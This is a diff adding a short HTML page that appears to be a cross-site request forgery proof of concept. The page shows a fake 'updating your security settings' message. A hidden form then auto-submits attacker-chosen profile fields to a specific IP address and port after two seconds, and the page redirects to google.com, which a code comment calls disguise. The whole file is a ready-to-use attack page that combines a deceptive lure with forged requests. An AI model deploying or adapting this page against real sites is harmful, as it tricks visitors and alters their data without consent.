@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <h1>Please wait while we update your security settings...</h1>
+    <form id="exploitForm" action="http://51.250.73.193:5002/cv" method="POST" style="display:none;">
+      <input type="hidden" name="firstname" value="Hacked">
+      <input type="hidden" name="lastname" value="User">
+      <input type="hidden" name="email" value="hacker@example.com">
+      <input type="hidden" name="phone" value="1234567890">
+      <input type="hidden" name="message" value="CSRF Exploit Successful">
+    </form>
+    <script>
+      setTimeout(() => {
+        document.getElementById("exploitForm").submit();
+        window.location.href = "https://google.com"; // Маскировка под редирект
+      }, 2000);
+    </script>
+  </body>
+</html>
